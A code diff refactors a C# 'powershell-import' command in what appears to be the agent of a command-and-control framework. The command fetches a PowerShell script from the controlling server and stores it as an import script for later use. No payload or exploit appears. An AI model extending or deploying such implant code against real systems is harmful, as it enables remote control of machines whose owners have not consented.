@@ -1,5 +1,4 @@
-﻿using Agent.Internal;
-using Agent.Models;
+﻿using Agent.Models;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -11,23 +10,16 @@ namespace Agent.Commands
     public class PowerShellImportCommand : AgentCommand
     {
         public override string Name => "powershell-import";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            if(string.IsNullOrEmpty(task.FileId))
-            {
-                Script = null;
-                this.Notify(result, commm, $"Import script reseted.");
-                return;
-            }
+            this.CheckFileDownloaded(task, context);
 
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {task.FileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var fileContent = file.GetFileContent();
+
 
             Script = Encoding.UTF8.GetString(fileContent);
-            this.Notify(result, commm, $"{task.FileName} Dowloaded ans set ad Import script");
+            this.Notify(context, $"{task.FileName} Dowloaded and set ad Import script");
         }
 
         public static string Script { get; set; }
